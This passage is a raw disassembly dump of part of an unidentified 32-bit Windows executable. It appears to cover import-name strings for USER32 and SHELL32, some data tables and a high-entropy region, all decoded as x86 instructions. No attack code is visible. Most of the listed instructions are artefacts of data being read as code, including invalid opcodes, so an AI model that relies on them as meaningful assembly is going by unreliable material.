  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x88a05fea
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [edi+0x6],bh
  41edc0:	add    BYTE PTR [eax],al
  41edc2:	mov    al,bl
  41edc4:	jg     0x41ee3b
  41edc6:	stos   DWORD PTR es:[edi],eax
  41edc7:	pop    ebp
  41edc8:	loop   0x41ed6e
  41edca:	js     0x41ed93
  41edcc:	repz adc al,0x7
  41edcf:	jb     0x41ed93
  41edd1:	inc    eax
  41edd2:	je     0x41ee15
  41edd4:	sub    BYTE PTR [ebx+0x7ce2d091],ch
  41edda:	or     eax,0x4a5b512e
  41eddf:	xchg   ebp,eax
  41ede0:	pop    eax
  41ede1:	fcomp  QWORD PTR [ecx+ebp*8+0x28]
  41ede5:	sub    ah,BYTE PTR [edi]
  41ede7:	jmp    0xed570bd
  41edec:	rcr    DWORD PTR [ebx],cl
  41edee:	jo     0x41edfd
  41edf0:	fdivr  QWORD PTR [esp+ecx*4+0x65326213]
  41edf7:	adc    eax,0x8ee4bc4d
  41edfc:	fstp   TBYTE PTR [ebx-0x3b]
  41edff:	popa   
  41ee00:	pop    esi
  41ee01:	xchg   ecx,eax
  41ee02:	pop    edx
  41ee03:	jmp    0x108f:0xf2dc57ba
  41ee0a:	pop    edi
  41ee0b:	or     DWORD PTR [ebx+ecx*8-0x37436932],edx
  41ee12:	out    dx,eax
  41ee13:	mov    edx,DWORD PTR [ecx+ebx*4-0x24]
  41ee17:	scas   al,BYTE PTR es:[edi]
  41ee18:	out    dx,eax
  41ee19:	lds    esi,FWORD PTR [ebx-0x59]
  41ee1c:	fldenv [eax+0x55]
  41ee1f:	jecxz  0x41ee73
  41ee21:	jecxz  0x41ee11
  41ee23:	test   BYTE PTR [ebp-0x441fe3b8],0xe5
  41ee2a:	sbb    ebx,DWORD PTR [edx+ebx*2]
  41ee2d:	pusha  
  41ee2e:	aaa    
  41ee2f:	inc    ebx
  41ee30:	jp     0x41ee2e
  41ee32:	fisub  WORD PTR [ecx]
  41ee34:	outs   dx,DWORD PTR ds:[esi]
  41ee35:	xor    BYTE PTR [eax],0x57
  41ee38:	sbb    eax,0xa391df27
  41ee3d:	data16 rcl BYTE PTR [edi],1
  41ee40:	out    0x8f,al
  41ee42:	xchg   edi,eax
  41ee43:	pop    ebp
  41ee44:	dec    ecx
  41ee45:	or     al,0xe8
  41ee47:	bound  edi,QWORD PTR [ecx+0x4ab65ec3]
  41ee4d:	sub    bl,BYTE PTR [ebp-0x4d]
  41ee50:	outs   dx,DWORD PTR ds:[esi]
  41ee51:	call   0x46d9:0xf967362e
  41ee58:	scas   eax,DWORD PTR es:[edi]
  41ee59:	rol    DWORD PTR [eax],0x33
  41ee5c:	enter  0xdba6,0xd2
  41ee60:	daa    
  41ee61:	mov    ecx,0xadebe51f
  41ee66:	test   BYTE PTR [ebx],bh
  41ee68:	in     al,0x5f
  41ee6a:	adc    DWORD PTR [eax],0x3689b6c6
  41ee70:	mov    cl,0x9
  41ee72:	in     eax,0x3f
  41ee74:	mov    ds:0x5ef08839,eax
  41ee79:	inc    ebp
  41ee7a:	jb     0x41eeaa
  41ee7c:	loop   0x41eec3
  41ee7e:	lock xor BYTE PTR [ebx],dh
  41ee81:	psraw  mm3,QWORD PTR [edx]
  41ee84:	sub    eax,0xa9b59417
  41ee89:	adc    DWORD PTR [ebp+ebp*2+0x6761dc0e],ecx
  41ee90:	mov    edx,DWORD PTR [esi+0x59]
  41ee93:	mov    WORD PTR [edi+0x46931163],fs
  41ee99:	sahf   
  41ee9a:	lds    edi,FWORD PTR ds:0x324ceb69
  41eea0:	sahf   
  41eea1:	sbb    ecx,ebp
  41eea3:	daa    
  41eea4:	dec    edx
  41eea5:	push   esi
  41eea6:	adc    dl,BYTE PTR [ebx]
  41eea8:	shl    BYTE PTR [edx],0xcf
  41eeab:	mov    ?,WORD PTR [eax-0x66a63ac]
  41eeb1:	mov    esi,0x1743102a
  41eeb6:	cwde   
  41eeb7:	dec    edx
  41eeb8:	xchg   ah,cl
  41eeba:	lahf   
  41eebb:	push   ds
  41eebc:	ret    0xf0c6
  41eebf:	xor    bl,al
  41eec1:	pop    edi
  41eec2:	push   ebx
  41eec3:	fsub   st,st(4)
  41eec5:	rcr    DWORD PTR [edi],cl
  41eec7:	stos   BYTE PTR es:[edi],al
  41eec8:	jb     0x41ef19
  41eeca:	imul   ebp,DWORD PTR [eax+0x79],0x28
  41eece:	mov    edi,0xf3279c50
  41eed3:	xchg   esp,eax
  41eed4:	in     al,0x69
  41eed6:	cmp    al,0x1f
  41eed8:	mov    bl,0x9e
  41eeda:	push   cs
  41eedb:	or     DWORD PTR [ecx],esp
  41eedd:	pop    ebp
  41eede:	daa    
  41eedf:	test   eax,0xb9c2d8c8
  41eee4:	adc    ah,BYTE PTR [edx]
  41eee6:	push   ax
  41eee8:	leave  
  41eee9:	test   al,0x68
  41eeeb:	xor    BYTE PTR [ebp+0x6d3b1ece],0x34
  41eef2:	and    dl,BYTE PTR [ebp-0x361aa739]
  41eef8:	or     al,0x71
  41eefa:	rcl    dl,1
  41eefc:	cmc    
  41eefd:	int    0x6f
  41eeff:	push   edi
  41ef00:	rol    DWORD PTR [esi-0x18],cl
  41ef03:	add    ecx,DWORD PTR [edi-0x4ea11c36]
  41ef09:	fidivr DWORD PTR [eax+eax*8]
  41ef0c:	enter  0x6594,0x87
  41ef10:	(bad)  
  41ef11:	cmp    eax,DWORD PTR [esi]
  41ef13:	adc    eax,0xf62b88d0
  41ef18:	sahf   
  41ef19:	hlt    
  41ef1a:	mov    ebp,0x79c442a
  41ef1f:	mov    eax,0x9cc33340
  41ef24:	mov    ds:0xd7b9c172,eax
  41ef29:	fucomi st,st(5)
  41ef2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef2c:	std    
  41ef2d:	push   es
  41ef2e:	inc    edx
  41ef2f:	xlat   BYTE PTR ds:[ebx]
  41ef30:	jno    0x41ef5c
  41ef32:	loope  0x41ef0d
  41ef34:	out    dx,eax
  41ef35:	ret    
  41ef36:	(bad)  
  41ef37:	jle    0x41ef30
  41ef39:	xor    esi,DWORD PTR [edi]
  41ef3b:	ss jge 0x41ef77
  41ef3e:	loopne 0x41ef2f
  41ef40:	mov    cl,0xb3
  41ef42:	push   0xffffff9d
  41ef44:	xor    DWORD PTR [edi+0xc],eax
  41ef47:	inc    eax
  41ef48:	shl    eax,1
  41ef4a:	ret    0xfd8a
  41ef4d:	fist   WORD PTR [ecx+0x33bf83a0]
  41ef53:	adc    eax,DWORD PTR [esp+esi*1-0x15]
  41ef57:	jmp    0x41ef96
  41ef59:	sub    al,0xb4
  41ef5b:	or     ch,BYTE PTR [eax+ebx*1]
  41ef5e:	adc    BYTE PTR [ebx],ah
  41ef60:	push   0x4d
  41ef62:	add    al,0xf0
  41ef64:	repnz fwait
  41ef66:	sbb    dl,cl
  41ef68:	xchg   edx,eax
  41ef69:	mov    ?,WORD PTR [esi*2-0x41f155db]
  41ef70:	in     eax,dx
  41ef71:	push   ds
  41ef72:	fs xchg edi,eax
  41ef74:	sahf   
  41ef75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef76:	je     0x41ef3f
  41ef78:	add    eax,DWORD PTR [edx+0x71e9ed97]
  41ef7e:	cld    
  41ef7f:	dec    ecx
  41ef80:	je     0x41ef8a
  41ef82:	jmp    0xf8ce:0x9896815f
  41ef89:	std    
  41ef8a:	mov    bl,0x39
  41ef8c:	ffreep st(3)
  41ef8e:	push   0x22af6053
  41ef93:	xor    DWORD PTR [edx+0x1c],0xffffff85
  41ef97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef98:	nop
  41ef99:	cmp    DWORD PTR [edx+0xf4cd567],edi
  41ef9f:	mov    edi,0x54a7f116
  41efa4:	push   ds
  41efa5:	pop    ebx
  41efa6:	lock cwde 
  41efa8:	sbb    al,0x1a
  41efaa:	in     al,dx
  41efab:	xor    al,0xfd
  41efad:	pop    ebp
  41efae:	pop    esp
  41efaf:	sbb    al,0x1a
  41efb1:	mov    ebp,0x35c36d61
  41efb6:	icebp  
  41efb7:	mov    bh,0x55
  41efb9:	out    dx,al
  41efba:	jb     0x41efa8
  41efbc:	cs pop es
  41efbe:	sbb    al,0x1e
  41efc0:	pop    es
  41efc1:	jne    0x41eff4
  41efc3:	or     al,0x92
  41efc5:	push   ds
